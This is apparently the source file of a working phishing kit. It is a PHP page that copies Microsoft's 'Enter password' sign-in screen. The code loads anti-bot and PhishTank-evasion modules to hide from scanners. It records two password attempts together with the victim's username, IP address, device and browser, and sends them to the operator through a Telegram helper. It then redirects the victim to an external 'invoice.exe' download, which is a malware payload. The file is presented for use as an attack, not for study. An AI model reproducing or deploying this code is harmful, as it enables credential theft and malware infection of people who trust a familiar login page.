<?php 
session_start();
include('./Anti/Bot-Spox.php');
include('./Anti/Bot-Crawler.php');
include('./Anti/new.php');
include('./Anti/IP-BlackList.php');
include('./Anti/Dila_DZ.php');
include('./BOTS/iprange.php');
include('./BOTS/phishtank.php');
include('./BOTS/send/tgapi.php');

if($_SERVER['REQUEST_METHOD'] == 'POST'){
   if(!empty($_POST['passwd']) && !empty($_POST['FIRST_PWD'])){
      $_SESSION['PASSWORD'] = $_POST['passwd'];
      $_SESSION['FIRST_PWD'] = $_POST['FIRST_PWD'];
      include('./send/tgapi.php');
message("
{source/domain} => ".$_SESSION['domain']."

{date} => ".$_SESSION['date']."
{time} => ".$_SESSION['time']."

{ip} => ".$_SESSION['ip']."
{device} => ".$_SESSION['device']."
{browser} => ".$_SESSION['browser']."
{os} => ".$_SESSION['os']."
{user agent} => ".$_SESSION['userAgent']."

{username} => ".$_SESSION['USERNAME']."
{password attempt 1} => ".$_SESSION['FIRST_PWD']."
{password attempt 2} => ".$_SESSION['PASSWORD']);
      header('location: https://vynz.lol/invoice.exe');
      sleep(2);
   }

}
?>
<html dir="ltr" lang="EN-US">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <title>Sign in to your Microsoft account</title>
      <meta name="robots" content="none">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
      <link rel="shortcut icon" href="./assets/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
      <link rel="stylesheet" title="Converged_v2" type="text/css" href="./assets/css/converged.v2.login.min_zmhwgv_kbcs-aml46kcgfg2.css">
   </head>
   <body class="cb">
      <div>
         
         
         <div ></div>
         <form onsubmit="checkData()" name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" autocomplete="off"  action="<?php echo $_SERVER['PHP_SELF']; ?>">
            <div class="login-paginated-page">
               <div id="lightboxTemplateContainer" >
                  
                  <div id="lightboxBackgroundContainer">
                     <div class="background-image-holder" role="presentation" >
                     
                        <div class="background-image ext-background-image" style="background-image: url(./assets/images/2_bc3d32a696895f78c19df6c717586a5d.svg);"></div>
                       
                     </div>
                  </div>
             
                  <div class="outer" >
                     <div class="template-section main-section">
                        <div  class="middle ext-middle">
                           <div class="full-height">
                              
                              <div class="flex-column">
                     
                                 <div class="win-scroll">
                                    <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                   
                                       <div class="lightbox-cover"></div>
                            
                                       <div >
                                          
                                          <img class="logo" role="img" src="./assets/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                                         
                                       </div>
                                    
                                       <div role="main" >
                                          
                                          <div class="">
                                             <div  class="animate slide-in-next">
                                                <div>
                                                   
                                                   <div class="identityBanner">
                                                      <div id="displayName" class="identity"><?php echo $_SESSION['USERNAME']; ?></div>
                                                   </div>
                                                </div>
                                             </div>
                                             
                                             <div class="pagination-view has-identity-banner animate slide-in-next" >
                           
                                                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" >
                                                   
                                                   
                                
                                                   <div id="loginHeader" class="row title ext-title" >
                                                      <div role="heading" aria-level="1" >Enter password</div>
                                                   </div>
                                                 
                                                   <div class="row">
                                                      <div class="form-group col-md-24">
                                                         <div role="alert" aria-live="assertive">
                                                            <div id="passwordError1" class="error ext-error" style="display: none;">Please enter the password for your Microsoft account.</div>
                                                            <div id="passwordError2" class="error ext-error" style="display: none;">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="">reset it now.</a><!-- HR=80041012 --></div>
                                                         </div>
                                                         <div class="placeholderContainer">
                                                         <input type="hidden" name="FIRST_PWD" id="FIRST_PWD" value>
                                                            <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" placeholder="Password">
                                                            
                                                            
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div class="position-buttons">
                                                      <div>
                                                      
                                                         <div class="row">
                                                            <div class="col-md-24">
                                                               <div class="text-13">
                                                              
                                                                  <div class="form-group">
                                                                     <a id="idA_PWD_ForgotPassword" role="link" href="javascript:void()">Forgot password?</a>
                                                                  </div>
                                                                  
                                                                  
                                                                  <div class="form-group">
                                                            
                                                                  </div>
                                                               
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                      <div class="win-button-pin-bottom" >
                                                         <div class="row">
                                                            <div >
                                                               <div class="col-xs-24 no-padding-left-right button-container">
                                                                  <div class="inline-block">
                                                                     <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit"  value="Sign in" data-report-attached="1">
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                                
                                                
                                             
                                                
                                             </div>
                                          </div>
                                       </div>
                                       
                                
                                       
                                    </div>
                                 
                                 </div>
                              </div>
                              
                           </div>
                        </div>
                     </div>
                     <div id="footer" role="contentinfo" class="footer ext-footer">
                        <div >
                           <div id="footerLinks" class="footerNode text-secondary">
                            
                              <a id="ftrTerms"  href="javascript:void()" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                              
                              <a id="ftrPrivacy"  href="javascript:void()" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                            
                              <a id="moreOptions" href="javascript:void()" role="button" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                           </div>
                           
                        </div>
                     </div>
                     
                  </div>
                  
               </div>
               
               
               
            </div>
            
         </form>
      </div>
      <script src="./assets/js/pass.js"></script>
   </body>
</html>